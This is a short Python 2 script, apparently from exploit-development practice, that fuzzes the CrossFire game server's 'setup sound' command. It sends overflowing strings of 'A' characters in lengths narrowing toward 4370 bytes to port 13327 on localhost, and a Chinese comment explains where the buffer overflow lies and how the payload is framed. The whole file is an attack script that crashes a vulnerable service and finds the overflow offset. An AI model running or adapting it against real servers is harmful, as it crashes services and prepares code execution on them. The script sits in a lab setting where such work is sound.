#!/usr/bin/python
#coding=utf-8
import socket
import time

def CreateBuffer():
	buffer = ['A']
	counter = 1000
	while len(buffer) <= 50:
		buffer.append('A' * counter)
		counter += 100
	return buffer

def main():
	host = '127.0.0.1'
	# No.1
	# buffer = CreateBuffer()
	# No.2
	# buffer = ['A' * 4400, 'A' * 4500]
	# No.3
	'''buffer = []
	for i in range(1,10):
		buffer.append('A' * (4300 + i*10))'''
	# No.4
	buffer = []
	for i in range(1,10):
		buffer.append('A' * (4370 + i))

	for string in buffer:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			# 该缓冲区溢出存在于setup sound指令中，\x11为DC1设备控制1，后面nop加null表示指令完成
			payload = "\x11(setup sound " + string + "\x90\x00#"
			print "[*]Fuzzing CrossFire with %s bytes..." % len(string)
			s.connect((host, 13327))
			data = s.recv(1024)
			print data
			s.send(payload)
			s.close()
			print "[*]Payload Sent!"
			time.sleep(1)
		except Exception as e:
			print "[-]Can't connect CrossFire!"
			print e
			exit()

if __name__ == '__main__':
	main()
